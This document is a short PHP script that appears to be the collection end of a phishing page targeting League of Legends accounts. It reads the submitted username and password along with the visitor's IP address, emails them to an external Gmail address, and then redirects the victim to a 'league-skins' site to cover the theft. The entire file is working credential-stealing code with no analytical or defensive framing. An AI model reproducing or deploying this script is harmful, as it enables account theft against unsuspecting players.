<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "-----------------|Account LOL|-------------------\n";
$message .= "Mail                            : ".$_POST['username']."\n";
$message .= "Pass                    : ".$_POST['password']."\n";
$message .= "-----------------|Account LOL|-------------------\n";
$send="corphosdiamond@gmail.com";
$subject = "LOL INFO | $ip";
$headers = "From: LOL <LOL@fucked.com>";
mail($send,$subject,$message,$headers);
header("Location: http://gamerscrown.com/league-skins/");
?>
